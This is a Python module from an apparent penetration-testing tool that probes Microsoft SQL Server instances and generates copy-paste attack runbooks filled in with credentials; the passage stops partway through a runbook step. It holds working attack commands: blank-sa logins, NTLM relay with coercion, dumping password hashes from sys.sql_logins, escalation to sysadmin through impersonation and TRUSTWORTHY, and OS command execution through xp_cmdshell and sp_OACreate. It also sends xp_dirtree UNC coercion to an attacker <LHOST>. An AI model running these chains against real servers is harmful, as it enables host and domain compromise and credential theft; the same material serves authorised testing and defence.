"""MSSQL (Microsoft SQL Server) offensive enumeration + attack-chain runbook.

What state-of-the-art MSSQL offensive tooling (PowerUpSQL, impacket-mssqlclient,
nxc mssql, MSSQLPwner, SQLRecon) does, folded into recce's model:

  * PRE-AUTH, airgapped (stdlib only): SQL Browser (UDP 1434) instance / version /
    port enumeration, and a TDS pre-login probe for the exact server version and
    whether login encryption is enforced - no credentials, no external tools.
  * ACCESS + PRIVILEGE (with creds, via nxc - auto-run when present): which servers
    the credentials log into and whether the login is effectively admin (Pwn3d! =
    xp_cmdshell / sysadmin).
  * DEEP ENUM + PRIVESC CHAIN (the MSSQLPwner route): server roles, databases,
    TRUSTWORTHY DBs, the linked-server graph, impersonatable logins, xp_cmdshell /
    OLE / CLR / Agent status, sql_logins hashes and saved credentials - then the
    escalation chains (impersonation, TRUSTWORTHY+db_owner, linked-server hops,
    UNC->relay) and the command execution for effect (xp_cmdshell / sp_OACreate /
    CLR / Agent).

recce does the pre-auth probing itself and generates the full, credential-filled
runbook + chain (copy-paste ready); it references existing tools (nxc / impacket /
mssqlpwner) for the authenticated actions. Airgapped, stdlib only for the pre-auth
probe. Safety posture: see SECURITY.md.
"""
from __future__ import annotations

import socket
import struct

from .models import Host, Port

SQLBROWSER_PORT = 1434
_DEFAULT_PORT = 1433

# SQL Server major-version -> marketing name (for a friendly product label + so a
# stale build is obvious). Keyed on the TDS/browser major number.
VERSION_NAMES = {
    "8": "SQL Server 2000", "9": "SQL Server 2005", "10": "SQL Server 2008/R2",
    "11": "SQL Server 2012", "12": "SQL Server 2014", "13": "SQL Server 2016",
    "14": "SQL Server 2017", "15": "SQL Server 2019", "16": "SQL Server 2022",
}


def is_mssql(port: Port) -> bool:
    if port.portid in (1433,):
        return True
    blob = f"{port.service} {port.product}".lower()
    return "ms-sql" in blob or "mssql" in blob or "microsoft sql" in blob


def version_name(ver: str) -> str:
    """'15.0.2000.5' -> 'SQL Server 2019 (15.0.2000.5)'."""
    if not ver:
        return ""
    major = ver.split(".")[0]
    name = VERSION_NAMES.get(major)
    return f"{name} ({ver})" if name else ver


# --- SQL Browser (UDP 1434) -----------------------------------------------------

def _parse_browser(text: str) -> list[dict]:
    """Parse the SQL Browser SVR_RESP string. Instances are separated by ';;';
    each is a flat 'Key;Value;Key;Value;...' list."""
    out = []
    for chunk in text.split(";;"):
        parts = chunk.split(";")
        if len(parts) < 2:
            continue
        kv = {}
        for i in range(0, len(parts) - 1, 2):
            k, v = parts[i].strip(), parts[i + 1].strip()
            if k:
                kv[k.lower()] = v
        if kv.get("servername") or kv.get("instancename"):
            out.append({
                "server": kv.get("servername", ""),
                "instance": kv.get("instancename", ""),
                "clustered": kv.get("isclustered", ""),
                "version": kv.get("version", ""),
                "tcp": kv.get("tcp", ""),
                "np": kv.get("np", ""),
            })
    return out


def sql_browser(ip: str, timeout: float = 3.0) -> list[dict]:
    """Enumerate SQL Server instances via the SQL Browser (UDP 1434) - instance
    names, versions and TCP ports, NO credentials. Returns [] on any failure."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        try:
            s.sendto(b"\x02", (ip, SQLBROWSER_PORT))    # CLNT_UCAST_EX: list all
            data, _ = s.recvfrom(65535)
        finally:
            s.close()
    except OSError:
        return []
    if len(data) < 3 or data[0] != 0x05:
        return []
    # byte0 = 0x05, bytes1-2 = little-endian length, then the ASCII payload.
    return _parse_browser(data[3:].decode("latin-1", "replace"))


# --- TDS pre-login (TCP) --------------------------------------------------------

def _build_prelogin() -> bytes:
    """A minimal, valid TDS PRELOGIN request (VERSION/ENCRYPTION/INSTOPT/THREADID/
    MARS options). We request ENCRYPT_OFF so the server tells us its posture."""
    options = [(0x00, 6), (0x01, 1), (0x02, 1), (0x03, 4), (0x04, 1)]
    values = {0x00: b"\x00" * 6, 0x01: b"\x00", 0x02: b"\x00",
              0x03: b"\x00" * 4, 0x04: b"\x00"}
    table_size = 5 * len(options) + 1               # +1 for the 0xFF terminator
    offset = table_size
    table = b""
    data = b""
    for tok, ln in options:
        table += struct.pack(">BHH", tok, offset, ln)
        data += values[tok]
        offset += ln
    payload = table + b"\xff" + data
    header = struct.pack(">BBHHBB", 0x12, 0x01, 8 + len(payload), 0, 0, 0)
    return header + payload


_ENCRYPT = {0: "off (login only)", 1: "on", 2: "not supported", 3: "required"}


def _parse_prelogin(data: bytes) -> dict:
    """Parse a PRELOGIN response: server version + encryption posture."""
    if len(data) < 9 or data[0] != 0x04:
        return {}
    payload = data[8:]
    opts: dict[int, tuple[int, int]] = {}
    i = 0
    while i < len(payload) and payload[i] != 0xFF:
        if i + 5 > len(payload):
            break
        tok, off, ln = struct.unpack(">BHH", payload[i:i + 5])
        opts[tok] = (off, ln)
        i += 5
    out: dict = {}
    if 0x00 in opts:
        off, ln = opts[0x00]
        if off + 4 <= len(payload) and ln >= 4:
            major, minor = payload[off], payload[off + 1]
            build = struct.unpack(">H", payload[off + 2:off + 4])[0]
            out["version"] = f"{major}.{minor}.{build}"
    if 0x01 in opts:
        off, _ln = opts[0x01]
        if off < len(payload):
            out["encryption"] = _ENCRYPT.get(payload[off], str(payload[off]))
    return out


def prelogin(ip: str, port: int = _DEFAULT_PORT, timeout: float = 4.0) -> dict:
    """TDS pre-login probe: server version + whether login encryption is enforced,
    with NO credentials. Returns {} on any failure."""
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            s.settimeout(timeout)
            s.sendall(_build_prelogin())
            data = s.recv(4096)
    except OSError:
        return {}
    return _parse_prelogin(data)


# --- target discovery -----------------------------------------------------------

def mssql_targets(hosts: list[Host]) -> list[dict]:
    """Every MSSQL endpoint recce knows about, from the datastore. One row per
    open MSSQL port: {ip, hostname, port, product, version}."""
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_mssql(p):
                out.append({"ip": h.ip, "hostname": h.hostname, "port": p.portid,
                            "product": p.product, "version": p.version})
    return out


def probe_target(ip: str, port: int = _DEFAULT_PORT, active: bool = True,
                 instances: list | None = None) -> dict:
    """Credential-free gather for one endpoint: SQL Browser instances + a TDS
    pre-login (version, encryption). {instances:[...], prelogin:{...}}.

    `instances` may be passed pre-computed to avoid re-running the SQL Browser (UDP
    1434) query per port when one host exposes several MSSQL ports."""
    if not active:
        return {"instances": [], "prelogin": {}}
    inst = sql_browser(ip) if instances is None else instances
    return {"instances": inst, "prelogin": prelogin(ip, port)}


# --- credential substitution ----------------------------------------------------

def _fill(text: str, ctx: dict) -> str:
    """Substitute <ip>/<port>/<user>/<pass>/<domain>/<LHOST> tokens (longest first,
    single pass) so every command is copy-paste ready."""
    if not isinstance(text, str):
        return text
    subs = sorted(((k, v) for k, v in ctx.items() if v), key=lambda kv: -len(kv[0]))
    for tok, val in subs:
        text = text.replace(tok, str(val))
    return text


def _ctx(target: dict, creds: dict | None, lhost: str = "<LHOST>") -> dict:
    creds = creds or {}
    return {"<ip>": target.get("ip", "<ip>"), "<port>": str(target.get("port") or 1433),
            "<user>": creds.get("user") or "<user>", "<pass>": creds.get("secret") or "<pass>",
            "<domain>": creds.get("domain") or "<domain>", "<LHOST>": lhost}


# --- offline findings (misconfigurations / vulnerabilities) ---------------------

def _step(phase, step, tool, cmd, why):
    return {"phase": phase, "step": step, "tool": tool, "cmd": cmd, "why": why}


# Detailed, capability-focused narratives per finding kind - the "what this
# actually lets an attacker do" explanation for the report + write-ups. Accurate,
# educational, and specific to SQL Server.
_NARRATIVE = {
    "blank_login": (
        "A SQL Server login (classically 'sa', the built-in sysadmin) authenticates "
        "with an empty or trivial password. 'sa' is a member of the sysadmin fixed "
        "server role, so this is total control of the instance with no exploitation "
        "required: read or modify every database, dump all login password hashes "
        "(sys.sql_logins), decrypt stored credentials and linked-server passwords, "
        "and - most importantly - obtain operating-system command execution via "
        "xp_cmdshell (which sysadmin can enable in two statements). Because the "
        "commands then run as the SQL Server service account, this is a direct path "
        "from an unauthenticated/low-effort finding to code execution on the host and, "
        "typically, to SYSTEM and onward into the domain."),
    "sysadmin_creds": (
        "The supplied credentials are a member of the sysadmin fixed server role - "
        "effectively administrator of the database instance. A sysadmin can enable and "
        "run xp_cmdshell for OS command execution as the service account, load CLR "
        "assemblies or SQL Agent jobs as alternative execution paths, read every "
        "database regardless of object permissions, dump all login hashes, and "
        "decrypt stored credentials and linked-server passwords with the Service "
        "Master Key. There is no privilege boundary left inside SQL Server to cross; "
        "the remaining work is turning instance-admin into host and domain compromise."),
    "xp_cmdshell": (
        "xp_cmdshell is an extended stored procedure that spawns a Windows command "
        "shell and runs an arbitrary string, returning its output to the SQL client. "
        "Every command executes as the SQL Server *service account* - on a default "
        "install a virtual account (NT Service\\MSSQLSERVER) or, very commonly in AD "
        "environments, a domain service account. That is code execution on the "
        "database host: read/write the filesystem, run PowerShell, add a local user if "
        "the account is a local admin (service accounts often are), and - because the "
        "service account almost always holds SeImpersonatePrivilege - escalate to "
        "NT AUTHORITY\\SYSTEM with a Potato-family technique. From SYSTEM you can dump "
        "LSASS for cached domain credentials and the machine account and pivot; if the "
        "service runs as a domain account, its Kerberos/NetNTLM identity can also be "
        "coerced and relayed. xp_cmdshell is disabled by default, but any sysadmin "
        "re-enables it in two sp_configure statements - so 'disabled' is a speed bump, "
        "not a control, once your login is sysadmin."),
    "rce_confirmed": (
        "recce executed an operating-system command on the host through SQL Server and "
        "captured its output, proving code execution as the service account. This is "
        "the pivot point from database access to host compromise: the same primitive "
        "runs a beacon, adds an account, reads protected files, or (via "
        "SeImpersonate -> SYSTEM) dumps credentials for lateral movement."),
    "impersonation": (
        "The current login can EXECUTE AS a higher-privileged login - here one that is "
        "a sysadmin. SQL Server impersonation switches your execution context to the "
        "target login for the rest of the session, so a single 'EXECUTE AS "
        "LOGIN = ...' turns a low-privileged principal into sysadmin with no password "
        "and no exploit. This is a pure logic/permission flaw (an over-broad IMPERSONATE "
        "grant), it leaves little forensic trace, and it immediately unlocks every "
        "sysadmin capability including xp_cmdshell."),
    "trustworthy": (
        "A database is marked TRUSTWORTHY and is owned by a sysadmin. TRUSTWORTHY lets "
        "code inside that database act outside it, so a principal who is db_owner there "
        "can create a stored procedure WITH EXECUTE AS OWNER; because the owner is a "
        "sysadmin, the procedure runs with sysadmin rights and can add the attacker to "
        "the sysadmin role. This is a classic, reliable SQL Server privilege-escalation "
        "primitive - db_owner on the right database is equivalent to instance admin - "
        "and it needs only T-SQL, no OS access."),
    "linked_reachable": (
        "The instance defines linked servers - preconfigured connections to other SQL "
        "Server instances used for cross-server queries. From this foothold you can run "
        "queries (OPENQUERY) and, where 'rpc out' is enabled, arbitrary T-SQL "
        "(EXEC ... AT [link]) on the remote instance in the security context its linked "
        "login maps to. Linked logins frequently map to a fixed, high-privileged remote "
        "account (often sa), so a linked server is both a lateral-movement path and a "
        "potential privilege-escalation path onto another database host - and links "
        "chain, so one hop can lead to many."),
    "linked_sysadmin": (
        "Following the linked-server chain, recce reached a remote SQL Server instance "
        "where your effective login is a sysadmin. That means full control of a second "
        "(or Nth) database host reached entirely through trusted SQL connections - no "
        "new credentials needed. On that instance you have the whole sysadmin toolkit, "
        "including xp_cmdshell for OS command execution as *its* service account, so a "
        "single misconfigured linked login can cascade into compromise of every "
        "instance in the trust mesh."),
    "linked_fixed_login": (
        "A linked server uses a fixed login mapping - a specific remote login with a "
        "password stored on this instance - rather than passing the caller's identity. "
        "SQL Server keeps that password encrypted with the Service Master Key, and a "
        "sysadmin can decrypt it back to cleartext (PowerUpSQL's "
        "Get-SQLServerLinkedServerLogin does exactly this). When the mapping is to a "
        "privileged remote account such as sa, recovering it yields sysadmin on the "
        "remote instance and a reusable credential that may work elsewhere in the estate."),
    "hashes": (
        "recce read the password hashes of the SQL logins from sys.sql_logins (a "
        "sysadmin/CONTROL SERVER capability). These are crackable offline with hashcat "
        "mode 1731; SQL logins are frequently set to weak or reused passwords, and a "
        "cracked 'sa' or service login often authenticates to other SQL Servers - and "
        "sometimes to Windows - across the environment, turning one instance's hashes "
        "into estate-wide access."),
    "stored_credentials": (
        "SQL Server stores CREDENTIAL objects (and SQL Agent proxies built on them) that "
        "bind a Windows/domain account and its secret for use by jobs, linked servers "
        "and external access. The account name (credential_identity) is readable here "
        "and is often a privileged service or backup account; the password is encrypted "
        "with the Service Master Key and is recoverable by a sysadmin with PowerUpSQL. "
        "Recovering these yields real domain credentials that typically work well "
        "beyond SQL Server itself."),
    "ntlm_disclosure": (
        "Before authentication, SQL Server's NTLM negotiation leaks the host's NetBIOS "
        "name, DNS domain and FQDN. This is low-severity on its own but valuable for "
        "targeting: it confirms domain membership and names the box for coercion/relay "
        "and for building a picture of the environment without credentials."),
    "no_encryption": (
        "The instance advertised that it does not support TDS encryption, so login "
        "packets - including credentials for SQL authentication - and query data cross "
        "the network unprotected. An attacker positioned on the path (or performing "
        "ARP/LLMNR poisoning) can capture credentials and sensitive result sets, and "
        "the lack of enforced encryption also eases NTLM relay against the service."),
    "eol": (
        "The SQL Server build is past Microsoft's support lifecycle and no longer "
        "receives security updates. Beyond specific unpatched CVEs, an end-of-life "
        "database engine accumulates known weaknesses over time and cannot be brought "
        "to a secure baseline; it should be treated as a standing high-value target and "
        "prioritised for upgrade."),
    "mixed_mode": (
        "The instance runs in mixed authentication mode, so SQL Server logins (not just "
        "Windows/AD accounts) are accepted. That means the built-in 'sa' account exists "
        "and every SQL login is reachable for online password spraying and, once hashes "
        "are dumped, offline cracking. SQL logins are frequently weak or shared, so mixed "
        "mode materially widens the authentication attack surface compared with "
        "Windows-only auth."),
    "server_perms": (
        "This login holds a high-impact server-level permission without being a member "
        "of the sysadmin role - permissions are additive in SQL Server, so a single "
        "grant like IMPERSONATE ANY LOGIN (become any login, including sa), ALTER ANY "
        "LOGIN (reset sa's password), ALTER ANY SERVER ROLE (add yourself to sysadmin), "
        "or CONTROL SERVER (implicit everything) is a direct path to instance takeover. "
        "These are easy to miss because the account is not 'a sysadmin' on paper, yet it "
        "is functionally equivalent to one."),
    "public_role": (
        "A permission is granted to the public role, which every database principal and "
        "every login is a member of and cannot be removed from. Whatever public holds, "
        "the lowest-privileged account on the server holds too - so an over-granted "
        "public permission (anything beyond the CONNECT/VIEW baseline, especially at the "
        "server level) silently gives all authenticated users that capability, turning a "
        "single misconfiguration into estate-wide exposure or escalation."),
    "startup_proc": (
        "A stored procedure is flagged to run automatically, as sysadmin, every time the "
        "SQL Server service starts. This is a classic persistence mechanism: an attacker "
        "who reaches sysadmin plants a startup procedure that re-establishes access or "
        "runs a payload on each restart, surviving credential rotation. It is also a "
        "supply-chain/tampering risk, so every startup procedure should be accounted for."),
    "guest_enabled": (
        "The 'guest' user is enabled (has CONNECT) in one or more databases. Any login "
        "on the server - including the most low-privileged account, and in mixed mode "
        "any SQL login you can spray - can then enter that database as guest and read "
        "whatever guest/public can. Guest is disabled by default in user databases "
        "precisely because enabling it removes the per-database access boundary."),
    "object_perms": (
        "Object-level permissions are granted to the public or guest role, so every "
        "authenticated login inherits them. Read grants (SELECT) on sensitive tables "
        "expose that data to the whole server; write/execute grants (INSERT/UPDATE/"
        "DELETE/EXECUTE/CONTROL) let any login modify records or run procedures - a "
        "stored procedure granted to public can be an escalation or data-tampering "
        "primitive. This is how a single over-broad GRANT turns into estate-wide "
        "exposure without anyone appearing over-privileged individually."),
    "data_at_rest": (
        "With a login recce enumerated the databases, their tables (with row counts) "
        "and the columns whose names indicate sensitive data - passwords, tokens, "
        "PII (SSN/DOB/email/phone), and financial fields (card/CVV/IBAN/salary). This "
        "is the actual business impact of the access: a data breach of regulated or "
        "high-value information, and often a source of reusable credentials. The row "
        "counts show how much is exposed, and the named columns are exactly where to "
        "look; the demonstration should sample and redact rather than exfiltrate."),
    "write_proof": (
        "recce demonstrated - reversibly - that the login can not only read but MODIFY "
        "the database and change security state: it created a table, wrote and then "
        "altered a field, and (as sysadmin) toggled a temporary login's server-role "
        "membership, undoing every change in the same transaction sequence. This is a "
        "concrete integrity impact: an attacker with this access can tamper with "
        "records, plant or alter data, and grant themselves or others privileges. The "
        "proof is non-destructive by design (it reverts), but the capability it "
        "confirms is not."),
    "relay": (
        "Any authenticated login can make SQL Server reach out to a UNC path (e.g. via "
        "xp_dirtree), causing the *service account* to authenticate to an attacker-"
        "controlled host. That NetNTLM authentication can be relayed: to LDAP on a "
        "domain controller for resource-based constrained delegation or shadow "
        "credentials, to another SQL Server or SMB host where the account is privileged, "
        "or cracked offline. Because SQL service accounts are often domain accounts with "
        "broad rights, coercing and relaying one is a high-impact, credential-free-ish "
        "pivot out of the database and into the domain."),
}


def narrative_for(kind: str) -> str:
    return _NARRATIVE.get(kind, "")


# How MSSQL is tested end-to-end - the methodology shown at the top of the report so
# a reader understands what each phase looks for and why.
TESTING_NARRATIVE = [
    ("1. Discovery & fingerprint",
     "Identify SQL Server endpoints and enumerate named instances, versions and TCP "
     "ports via the SQL Browser service (UDP 1434), then send a TDS pre-login to read "
     "the exact build number and whether login encryption is enforced - all without "
     "credentials. The version drives CVE/EOL assessment and tells you which "
     "techniques apply."),
    ("2. Authentication testing",
     "Test what you can log in as: blank/default 'sa', anonymous/guest, and - with "
     "supplied credentials - which instances accept them and at what privilege "
     "(nxc reports 'Pwn3d!' when the login is effectively sysadmin). Note whether the "
     "instance allows SQL logins (mixed mode) or Windows auth only, which decides "
     "whether password spraying against SQL logins is in scope."),
    ("3. Privilege assessment",
     "Establish your effective rights: are you already sysadmin? Which logins are "
     "sysadmin (targets for impersonation/cracking)? Can you EXECUTE AS a "
     "sysadmin login? Are you db_owner on a TRUSTWORTHY database owned by a sysadmin? "
     "These determine whether escalation is needed and which path is shortest."),
    ("4. Escalation chains",
     "Chain the misconfigurations into sysadmin: impersonation (EXECUTE AS), "
     "TRUSTWORTHY + db_owner (a proc WITH EXECUTE AS OWNER), and the linked-server "
     "graph - recursively following linked servers (EXEC ... AT) to any instance where "
     "your mapped login is sysadmin. Each hop is verified from live server state, not "
     "assumed."),
    ("5. Command execution (effect)",
     "Turn instance-admin into host code execution as the SQL service account, and "
     "capture output: xp_cmdshell (native), OLE Automation (sp_OACreate), or a SQL "
     "Agent CmdExec job - the alternatives matter because xp_cmdshell is often "
     "disabled or monitored. From here, SeImpersonate typically yields SYSTEM."),
    ("6. Secrets & lateral movement",
     "Harvest what enables the next hop: sys.sql_logins password hashes (crack "
     "offline), stored CREDENTIAL objects and Agent proxies (privileged accounts), and "
     "fixed linked-server login passwords (decryptable with the Service Master Key). "
     "Where Windows auth is in play, coerce the service account over UNC and relay its "
     "NetNTLM to LDAP/SMB/another SQL Server."),
]


def _finding(sev, title, target, detail, tool, cmd, rem, cwes, kind=""):
    return {"category": "mssql", "severity": sev, "title": title, "target": target,
            "detail": detail, "tool": tool, "command": cmd, "remediation": rem,
            "cwes": list(cwes), "kind": kind, "narrative": _NARRATIVE.get(kind, "")}


def _port_scripts(host: Host, portid: int) -> dict:
    for p in host.ports:
        if p.portid == portid:
            return {s.id: s.output for s in p.scripts}
    return {}


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    """MSSQL misconfigurations / vulnerabilities from what recce already holds
    (nmap ms-sql-* NSE output + the pre-auth probe), each with the exact command to
    prove/abuse it. `probes` maps 'ip:port' -> probe_target() result."""
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for t in [p for p in h.open_ports if is_mssql(p)]:
            tgt = f"{h.ip}:{t.portid}"
            ctx = {"<ip>": h.ip, "<port>": str(t.portid)}
            scripts = _port_scripts(h, t.portid)
            pl = (probes.get(tgt) or {}).get("prelogin") or {}

            # sa / login with a blank or trivial password -> instant sysadmin.
            # Gate on POSITIVE evidence, not mere script presence: nmap's
            # ms-sql-empty-password script runs on every 1433 during enum and lands
            # in `scripts` even when it authenticated nothing (empty/negative
            # output), so keying off `"...-empty-password" in scripts` fired a
            # critical "blank password" finding on every instance. Require the
            # script's own "Login Success" marker (an account really logged in with
            # an empty password) or a parsed empty-password vuln the parser vetted.
            esp = scripts.get("ms-sql-empty-password", "")
            blank = (any("empty password" in (v.title or "").lower() and v.port == t.portid
                         for v in h.vulns)
                     or "login success" in esp.lower())
            if blank:
                out.append(_finding(
                    "critical", "MSSQL login with a blank password (sysadmin -> RCE)",
                    tgt, "An account (typically 'sa') authenticates with an empty "
                    "password - full control of the instance.", "impacket-mssqlclient",
                    _fill("impacket-mssqlclient sa@<ip> -p <port>   # blank password; then "
                          "enable_xp_cmdshell; xp_cmdshell whoami", ctx),
                    "Set a strong sa password (or disable sa); enforce a password policy.",
                    ["CWE-521", "CWE-1392"], kind="blank_login"))

            # xp_cmdshell already enabled -> RCE as the service account.
            xpc = scripts.get("ms-sql-xp-cmdshell", "")
            if xpc and "error" not in xpc.lower() and "disabled" not in xpc.lower():
                out.append(_finding(
                    "high", "xp_cmdshell is enabled (OS command execution)",
                    tgt, "The instance can run OS commands via xp_cmdshell as the SQL "
                    "service account.", "impacket-mssqlclient / nxc",
                    _fill("nxc mssql <ip> -u <user> -p <pass> -x whoami", ctx),
                    "Disable xp_cmdshell; run SQL under a low-privilege gMSA.",
                    ["CWE-250"], kind="xp_cmdshell"))

            # Pre-auth NTLM / host / domain disclosure (relay/coercion target).
            if "ms-sql-ntlm-info" in scripts:
                out.append(_finding(
                    "low", "MSSQL discloses NetBIOS / domain / FQDN pre-auth",
                    tgt, scripts["ms-sql-ntlm-info"].strip()[:200],
                    "manual / ntlmrelayx",
                    _fill("EXEC xp_dirtree '\\\\<LHOST>\\x';  # once logged in, coerce the "
                          "service account's NetNTLM -> relay (impacket-ntlmrelayx)", ctx),
                    "Restrict exposure; require SMB signing + EPA to blunt relay.",
                    ["CWE-200"], kind="ntlm_disclosure"))

            # TDS login encryption not supported at all -> creds sniffable.
            enc = pl.get("encryption")
            if enc == "not supported":
                out.append(_finding(
                    "medium", "MSSQL does not support login encryption (credential sniffing)",
                    tgt, "The server advertised no TDS encryption - login credentials "
                    "cross the wire unprotected.", "wireshark / responder",
                    _fill("impacket-mssqlclient <user>@<ip> -p <port>   # traffic is unencrypted",
                          ctx),
                    "Install a certificate and enable Force Encryption on the instance.",
                    ["CWE-319"], kind="no_encryption"))

            # Unsupported / end-of-life SQL Server (no security patches).
            ver = pl.get("version") or t.version
            major = (ver or "").split(".")[0]
            if major.isdigit() and int(major) <= 12:      # 2014 and older are EOL
                out.append(_finding(
                    "medium", f"End-of-life SQL Server ({version_name(ver)})",
                    tgt, "This SQL Server build is out of support and receives no "
                    "security updates.", "version",
                    _fill("nmap -p <port> --script ms-sql-info <ip>", ctx),
                    "Upgrade to a supported SQL Server release.",
                    ["CWE-1104"], kind="eol"))
    return out


# --- credential-free runbook ----------------------------------------------------

def credfree_runbook(target: dict, lhost: str = "<LHOST>") -> list[dict]:
    """What to try with NO credentials: instance/version recon (recce already did
    the SQL Browser + pre-login probes), then default/anonymous access and relay."""
    ctx = _ctx(target, None, lhost)
    f = lambda s: _fill(s, ctx)   # noqa: E731
    return [
        _step("Recon (no creds)", "SQL Browser instance/version/port enumeration",
              "recce (stdlib) / nmap",
              f("nmap -sU -p 1434 --script ms-sql-info <ip>"),
              "Instance names, versions and TCP ports without authenticating."),
        _step("Recon (no creds)", "TDS pre-login: version + encryption posture",
              "recce (stdlib)",
              f("recce mssql <ip>   # sends a TDS pre-login and reads the version/encryption"),
              "Exact server version (-> CVE mapping) and whether login is encrypted."),
        _step("Access (no creds)", "Blank / default 'sa' login",
              "nxc / impacket-mssqlclient",
              f("nxc mssql <ip> -u sa -p '' --local-auth   ;   impacket-mssqlclient sa@<ip>"),
              "A blank or default sa password is instant sysadmin (RCE)."),
        _step("Access (no creds)", "Anonymous / guest login",
              "nxc",
              f("nxc mssql <ip> -u '' -p ''   ;   nxc mssql <ip> -u guest -p ''"),
              "Some instances allow a null/guest session that still enumerates."),
        _step("Access (no creds)", "NTLM relay to MSSQL (with a coercion)",
              "impacket-ntlmrelayx",
              f("impacket-ntlmrelayx -t mssql://<ip> -smb2support   # + coerce a victim "
                "(PetitPotam/printerbug) to auth -> relayed as that account"),
              "If Windows auth is on, a relayed privileged account logs straight in."),
    ]


# --- credentialed runbook (the MSSQLPwner route) --------------------------------

def cred_runbook(target: dict, creds: dict | None, lhost: str = "<LHOST>") -> list[dict]:
    """With credentials: prove access, enumerate everything, escalate, get effect.
    Mirrors PowerUpSQL / MSSQLPwner. Every command is pre-filled with the creds."""
    ctx = _ctx(target, creds, lhost)
    f = lambda s: _fill(s, ctx)   # noqa: E731
    q = lambda tsql: f("nxc mssql <ip> -u <user> -p <pass> -q \"%s\"" % tsql)  # noqa: E731
    steps = [
        _step("Access", "Which servers accept these creds (and are you admin?)",
              "nxc mssql",
              f("nxc mssql <ip> -u <user> -p <pass> -d <domain>   "
                "# 'Pwn3d!' = sysadmin / xp_cmdshell"),
              "nxc is the fastest access + privilege matrix; --local-auth for SQL logins."),
        _step("Access", "Interactive shell on the instance", "impacket-mssqlclient",
              f("impacket-mssqlclient <domain>/<user>:<pass>@<ip>   "
                "(SQL auth: impacket-mssqlclient <user>:<pass>@<ip>)"),
              "A full T-SQL client for the enumeration + escalation below."),
        # --- enumerate everything ---
        _step("Enumerate", "Server identity, role, auth mode", "nxc / mssqlclient",
              q("SELECT @@VERSION; SELECT SERVERPROPERTY('MachineName'), SYSTEM_USER, "
                "IS_SRVROLEMEMBER('sysadmin'), SERVERPROPERTY('IsIntegratedSecurityOnly')"),
              "Who am I, am I already sysadmin, is it Windows-auth-only."),
        _step("Enumerate", "Logins and who is sysadmin", "mssqlclient",
              q("SELECT name, type_desc, is_disabled, IS_SRVROLEMEMBER('sysadmin', name) "
                "FROM sys.server_principals WHERE type IN ('S','U','G')"),
              "The privileged logins to target for impersonation / cracking."),
        _step("Enumerate", "Databases, owners and TRUSTWORTHY flag", "mssqlclient",
              q("SELECT name, is_trustworthy_on, SUSER_SNAME(owner_sid) AS owner "
                "FROM sys.databases"),
              "A TRUSTWORTHY db owned by a sysadmin is a db_owner -> sysadmin path."),
        _step("Enumerate", "Linked servers (lateral graph)", "mssqlclient",
              q("SELECT name, product, provider, data_source, is_linked FROM sys.servers"),
              "Linked servers let you EXECUTE AT / OPENQUERY other instances - pivot."),
        _step("Enumerate", "Impersonatable logins (privesc)", "mssqlclient",
              q("SELECT DISTINCT b.name FROM sys.server_permissions a JOIN "
                "sys.server_principals b ON a.grantor_principal_id=b.principal_id "
                "WHERE a.permission_name='IMPERSONATE'"),
              "Any sysadmin you can EXECUTE AS is an instant escalation."),
        _step("Enumerate", "Dangerous config (xp_cmdshell / OLE / CLR)", "mssqlclient",
              q("SELECT name, value_in_use FROM sys.configurations WHERE name IN "
                "('xp_cmdshell','Ole Automation Procedures','clr enabled')"),
              "What execution primitives are already on (or you can turn on as sa)."),
        _step("Secrets", "Dump SQL login password hashes (needs CONTROL SERVER)",
              "mssqlclient",
              q("SELECT name, password_hash FROM sys.sql_logins WHERE password_hash IS NOT NULL"),
              "Crack offline (hashcat -m 1731) - reuse across the estate."),
        _step("Secrets", "Stored credentials, linked-server logins, Agent proxies",
              "mssqlclient",
              q("SELECT name, credential_identity FROM sys.credentials; "
                "SELECT * FROM sys.linked_logins"),
              "Saved credentials often hold a domain / privileged account."),
        # --- escalate (the chains) ---
        _step("Escalate", "Impersonation chain -> sysadmin", "mssqlclient / nxc",
              f("EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin'); "
                "REVERT;   (nxc: -M mssql_priv)"),
              "If you can impersonate a sysadmin login, you ARE sysadmin."),
        _step("Escalate", "TRUSTWORTHY + db_owner -> sysadmin", "mssqlclient",
              f("USE <trustdb>; CREATE PROCEDURE dbo.x WITH EXECUTE AS OWNER AS "
                "EXEC sp_addsrvrolemember '<user>','sysadmin'; EXEC dbo.x;"),
              "db_owner on a TRUSTWORTHY db owned by a sysadmin escalates you to sysadmin."),
        _step("Escalate", "Linked-server hop (EXECUTE AT / OPENQUERY)", "mssqlclient / mssqlpwner",
              f("SELECT * FROM OPENQUERY([LINKED], 'SELECT SYSTEM_USER, "
                "IS_SRVROLEMEMBER(''sysadmin'')');   EXEC('sp_configure ''xp_cmdshell'',1;"
                "RECONFIGURE;EXEC xp_cmdshell ''whoami''') AT [LINKED];"),
              "Linked logins often map to sa on the remote - RCE there, then chain onward."),
        _step("Escalate", "MSSQLPwner: auto-map + walk the chain", "mssqlpwner",
              f("mssqlpwner <domain>/<user>:<pass>@<ip> enumerate; "
                "mssqlpwner <domain>/<user>:<pass>@<ip> interactive"),
              "Automates impersonation + linked-server chains to sysadmin and RCE."),
        # --- effect ---
        _step("Effect (RCE)", "xp_cmdshell", "nxc / mssqlclient",
              f("nxc mssql <ip> -u <user> -p <pass> -x 'whoami /all'   (mssqlclient: "
                "enable_xp_cmdshell; xp_cmdshell whoami)"),
              "OS command execution as the SQL service account."),
        _step("Effect (RCE)", "OLE Automation (sp_OACreate)", "mssqlclient",
              f("EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE; DECLARE @o INT; "
                "EXEC sp_OACreate 'WScript.Shell',@o OUT; EXEC sp_OAMethod @o,'Run',NULL,"
                "'cmd /c whoami > C:\\\\windows\\\\temp\\\\o.txt';"),
              "RCE path when xp_cmdshell is watched/disabled."),
        _step("Effect (RCE)", "CLR assembly / SQL Agent job", "mssqlpwner / PowerUpSQL",
              f("mssqlpwner <domain>/<user>:<pass>@<ip> custom-asm whoami   (or a SQL Agent "
                "CmdExec/PowerShell job)"),
              "Alternative execution primitives once you are sysadmin."),
        # --- lateral ---
        _step("Lateral", "Capture the service account's NetNTLM via UNC", "mssqlclient + ntlmrelayx",
              f("EXEC xp_dirtree '\\\\<LHOST>\\x';   with impacket-ntlmrelayx -t "
